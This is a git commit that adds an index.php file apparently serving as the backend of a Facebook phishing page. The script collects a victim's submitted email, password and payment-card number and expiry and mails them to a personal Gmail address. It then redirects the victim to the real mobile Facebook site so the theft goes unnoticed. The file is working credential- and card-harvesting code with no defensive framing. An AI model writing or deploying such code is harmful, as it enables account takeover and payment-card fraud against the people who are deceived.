19f03a8886c56cc16d7f0deb6b5eaf9dcf204ec8
hichamdacher <45106706+hichamdacher@users.noreply.github.com>
2020-03-02 19:54:21 +0300

    smsw

---
+++ index.php
@@ -0,0 +1,13 @@
+﻿<?php
+
+
+$message .= "Email Adresse       : ".$_POST['email']."\n";
+$message .= "Password          : ".$_POST['pass']."\n";
+
+$cc = $_POST['ccn'];
+$subject = "Facebook ".$_POST['exm']."/".$_POST['exy'];
+$send = "hichamdacher09@gmail.com";
+$headers = 'hichamdacher09@gmail.com' . "\r\n" .
+mail($send,$subject,$message,$headers);
+
+header("Location:https://m.facebook.com");?>
